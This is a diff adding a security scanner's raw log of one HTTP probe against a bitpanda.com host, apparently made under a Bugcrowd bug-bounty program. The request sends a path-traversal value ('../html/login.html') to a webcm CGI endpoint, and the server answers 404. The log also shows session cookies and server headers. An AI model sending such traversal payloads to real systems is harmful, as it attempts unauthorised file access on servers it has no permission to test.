@@ -1,0 +1,38 @@
+[quest-panel] Dumped HTTP request for https://socket.bitpanda.com/cgi-bin/webcm?getpage=../html/login.html
+
+
+GET /cgi-bin/webcm?getpage=../html/login.html HTTP/1.1
+Host: socket.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: AWSALB=Kv4x8fOfAP2pSUw0StOUKdSLyJc3LaWpKoxUqLHkVJHU04FOhhrT+GamE/E4kLByQe8X7XDu/qWfBnoOtJpq/pEbHyVkASdFm/fs8R8AfNlMCf6vsHdSBJfZ6x3f; AWSALBCORS=Kv4x8fOfAP2pSUw0StOUKdSLyJc3LaWpKoxUqLHkVJHU04FOhhrT+GamE/E4kLByQe8X7XDu/qWfBnoOtJpq/pEbHyVkASdFm/fs8R8AfNlMCf6vsHdSBJfZ6x3f
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[quest-panel] Dumped HTTP response https://socket.bitpanda.com/cgi-bin/webcm?getpage=../html/login.html
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 28
+Content-Type: application/json; charset=utf-8
+Date: Tue, 05 Aug 2025 12:52:17 GMT
+Etag: W/"1c-MOxLziJPE3pYclichFPQin1Cisg"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: istio-envoy
+Set-Cookie: AWSALB=ixDtyZpAi7o86v/2kDzwT79mCwQOq/1dSc9ca+PrmdVa376eu5FhNWo2ZhJKLiHuf7Uln7+5x6wLM6+tW/lKy8irCoDFGTLoCyx8yz4PI8cRgVcFxs7dk38DB6Vc; Expires=Tue, 12 Aug 2025 12:52:17 GMT; Path=/
+Set-Cookie: AWSALBCORS=ixDtyZpAi7o86v/2kDzwT79mCwQOq/1dSc9ca+PrmdVa376eu5FhNWo2ZhJKLiHuf7Uln7+5x6wLM6+tW/lKy8irCoDFGTLoCyx8yz4PI8cRgVcFxs7dk38DB6Vc; Expires=Tue, 12 Aug 2025 12:52:17 GMT; Path=/; SameSite=None; Secure
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 d45137f973d454db77c647196f56613a.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: LhMypoIXV5YItB3WJ6O6IrGlyjdTN6Ylp3LfRKJZ1e5P_hnGvKVS1w==
+X-Amz-Cf-Pop: IAD61-P2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Envoy-Decorator-Operation: socket-server.socket-server.svc.cluster.local:80/*
+X-Envoy-Upstream-Service-Time: 2
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+
+{"message":"Page not found"}
